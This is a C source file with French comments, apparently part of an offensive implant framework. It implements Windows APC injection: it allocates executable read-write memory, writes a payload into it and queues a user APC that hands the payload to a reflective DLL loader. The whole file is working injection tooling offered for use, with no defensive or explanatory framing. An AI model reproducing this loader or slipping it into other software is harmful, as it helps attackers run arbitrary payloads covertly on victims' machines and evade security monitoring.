/*
 * ============================================================
 *  apc_loader.c - APC Injection loader
 *
 *  Implémente une exécution d'une dll via APC Injection dans
 *  un thread cible du processus courant.
 *
 *  Séquence Windows :
 *    1. Ouvrir le processus courant (OpenProcess)
 *    2. Allouer une région RWX distante (VirtualAllocEx)
 *    3. Écrire le payload dans le processus distant (WriteProcessMemory)
 *    4. Ouvrir un thread du processus courant (OpenThread)
 *    5. Queuer l'APC (QueueUserAPC)
 *    6. Réveiller / exécuter le thread via ResumeThread
 *    7. Nettoyer handles / mémoire si nécessaire
 *
 * ============================================================
 */
#include "platform.h"
#include "apc_loader.h"
#include "rdll_loader.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef PLATFORM_WINDOWS
#include <windows.h>
#include <tlhelp32.h>

static module_result_t make_error(const char *msg) {
    module_result_t r = {0};
    r.status = -1;
    r.error_msg = _strdup(msg);
    return r;
}

typedef struct {
    const unsigned char *payload_bytes;
    size_t payload_size;
    const unsigned char *args;
    size_t args_len;
    module_result_t result;
    int completed;
} apc_runtime_context_t;

static VOID CALLBACK apc_exec_callback(ULONG_PTR param) {
    apc_runtime_context_t *ctx = (apc_runtime_context_t *)param;
    if (!ctx) return;

    ctx->result = rdll_loader_execute(
        ctx->payload_bytes,
        ctx->payload_size,
        ctx->args,
        ctx->args_len
    );
    ctx->completed = 1;
}

module_result_t apc_loader_execute(
    const unsigned char *payload_bytes,
    size_t payload_size,
    const unsigned char *args,
    size_t args_len
) {
    (void)args;
    (void)args_len;

    if (!payload_bytes || payload_size == 0) {
        return make_error("[APC] Payload vide ou invalide");
    }

    printf("[APC] Début APC Injection (%zu bytes)\n", payload_size);
    fflush(stdout);

    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        GetCurrentProcessId()
    );
    if (!hProcess) {
        return make_error("[APC] OpenProcess échoué");
    }

    LPVOID remote_mem = VirtualAllocEx(
        hProcess,
        NULL,
        payload_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    if (!remote_mem) {
        CloseHandle(hProcess);
        return make_error("[APC] VirtualAllocEx échoué");
    }

    SIZE_T bytes_written = 0;
    if (!WriteProcessMemory(
            hProcess,
            remote_mem,
            payload_bytes,
            payload_size,
            &bytes_written) || bytes_written != payload_size) {
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return make_error("[APC] WriteProcessMemory échoué");
    }

    apc_runtime_context_t ctx = {0};
    ctx.payload_bytes = payload_bytes;
    ctx.payload_size  = payload_size;
    ctx.args          = args;
    ctx.args_len      = args_len;

    if (!QueueUserAPC((PAPCFUNC)apc_exec_callback, GetCurrentThread(), (ULONG_PTR)&ctx)) {
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return make_error("[APC] QueueUserAPC échoué");
    }

    SleepEx(2000, TRUE);

    VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    if (!ctx.completed) {
        return make_error("[APC] L'APC n'a pas pu être exécuté");
    }

    return ctx.result;
}

#else

module_result_t apc_loader_execute(
    const unsigned char *payload_bytes,
    size_t payload_size,
    const unsigned char *args,
    size_t args_len
) {
    (void)payload_bytes; (void)payload_size; (void)args; (void)args_len;
    module_result_t r = {0};
    r.status = -1;
    r.error_msg = strdup("[APC] Technique non supportée sur Linux");
    return r;
}

#endif
